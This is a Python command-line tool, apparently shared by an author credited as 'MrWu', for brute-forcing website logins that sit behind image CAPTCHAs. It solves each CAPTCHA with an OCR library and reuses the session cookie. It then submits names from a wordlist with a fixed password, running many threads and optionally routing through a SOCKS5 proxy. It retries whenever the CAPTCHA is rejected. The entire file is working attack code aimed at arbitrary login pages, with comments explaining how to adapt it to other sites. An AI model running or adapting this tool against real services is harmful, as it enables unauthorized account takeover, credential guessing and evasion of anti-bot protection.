import requests,threading,base64,argparse,datetime,ddddocr,imghdr
from queue import Queue
from tqdm import tqdm

data_list = []
txt = Queue()

def banner():
    print('''                  _       _                         
                 | |     | |                        
   ___ __ _ _ __ | |_ ___| |__   __ _    __ _  ___  
  / __/ _` | '_ \| __/ __| '_ \ / _` |  / _` |/ _ \ 
 | (_| (_| | |_) | || (__| | | | (_| | | (_| | (_) |
  \___\__,_| .__/ \__\___|_| |_|\__,_|  \__, |\___/ 
           | |                           __/ |      
           |_|                          |___/       


    Author:MrWu  feedback:https://mrwu.red/fenxiang/4090.html        
                                               ''')

def save(data):
    f = open('log.txt', 'a',encoding='utf-8')
    f.write(data + '\n')
    f.close()

def _ocr(img):
    if imghdr.what(None,img) is not None:
        ocr = ddddocr.DdddOcr(show_ad=False)
        res = ocr.classification( img )
        return res
    else:
        tqdm.write("%s [error] 请求验证码内容返回非图片格式，请检查！"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        exit()

def captcha(captcha_url,proxy):
    try:
        if len(proxy['http']) <=9:  
            req = requests.get(captcha_url)
        else:
            req = requests.get(captcha_url, proxies=proxy)

        img_captcha = _ocr( req.content )
        cookies = requests.utils.dict_from_cookiejar(req.cookies)
        cookie = "; ".join([str(x)+"="+str(y) for x,y in cookies.items()])
        return cookie,img_captcha

    except Exception as e:
        tqdm.write("%s [error] %s"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),e))

def login(url,yzm,data_list,cookie,proxy):
    try:
        data = {"name":data_list,"password":'123456',"verify":yzm,"googleCode":""} #不同网站请自行修改这里的POST参数 data_list=密码字典 yzm=验证码
        cookie = {"Cookie": cookie}

        if len(proxy['http']) <=9:
            data = requests.post(url,data, headers=cookie)
        else:
            data = requests.post(url,data, headers=cookie, proxies=proxy)
        return data.status_code,data.text
    except Exception as e:
        tqdm.write("%s [error] %s"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),e))

def go(url,captcha_url,data_list,jg,proxy):
    try:
        yzm = captcha(captcha_url,proxy)
        stusts = login(url,yzm[1],data_list,yzm[0],proxy)

        res = [ele for ele in jg if(ele in str(stusts) or ele in str(stusts[0]))]

        if "验证码" in str(stusts):
            go(url,captcha_url,data_list,jg,proxy) # 验证码错误重试
        elif bool(res) == False:
            if len(str(stusts[1])) <= 50: #设定响应包长度小于等于50才打印响应包结果，如果需要显示更长的响应包，自行修改前面的数值
                tqdm.write("%s [info]  %s  ###  响应结果：%s"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),data_list,str(stusts[1])))
            else:
                save(data_list + " ### " + str(stusts[1]))
                tqdm.write("%s [info]  %s  ###  响应结果：响应包太大已关闭显示，请查看log.txt文件"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),data_list))

        return str(stusts[0])

    except Exception as e:
        tqdm.write("%s [error] %s"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),e))


def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', default='',help="登陆包URL地址,需带上协议头")
    parser.add_argument('-c','--captcha', default='',help="验证码图片地址,需带上协议头")
    parser.add_argument('-d','--data', nargs='+',default='',help="排除的结果关键词或者响应状态码，2者可一起用，空格分割")
    parser.add_argument('-q','--txt', default='',help="指定爆破字典路径")
    parser.add_argument('-t','--threads', default='20',help="指定线程数")
    parser.add_argument('-p','--proxy', default='',help="代理 格式： IP+端口")
    args = parser.parse_args()

    proxys = {'http': 'socks5://' + args.proxy,'https': 'socks5://' + args.proxy}

    if not all([args.url, args.captcha, args.data, args.txt]):
        print(''' 
    参数列表：
    -u/-url         登陆包URL地址,需带上协议头 （必须）
    -c/--captcha    验证码图片地址,需带上协议头 （必须）
    -d/--data       排除的结果关键词或者响应状态码，2者可一起用，空格分割 （必须）
    -q/--txt        指定爆破字典路径 （必须）
    -t/--threads    指定线程数
    -p/--proxy      代理 格式： IP+端口
            ''')
        print("[!] 有参数值为空，请重试！")
    else:
        def open_data(txt):
            with open(txt, 'r', encoding='utf-8') as f:
                for line in f:
                    data_list.append(line.replace("\n", ""))
                return data_list

        for x in open_data(args.txt):
            txt.put(x)

        def burst():
            while not txt.empty():
                data_list = txt.get()
                pbar.set_description("状态码： %s"%( go(args.url,args.captcha,data_list,args.data,proxys) ))
                pbar.update(1)

        pbar = tqdm(total=len(data_list), desc='任务开始',colour='#00ff00', position=0, ncols=75)

        for i in range(int(args.threads)):
            t = threading.Thread(target = burst)
            t.start()

if __name__ == '__main__':
    main()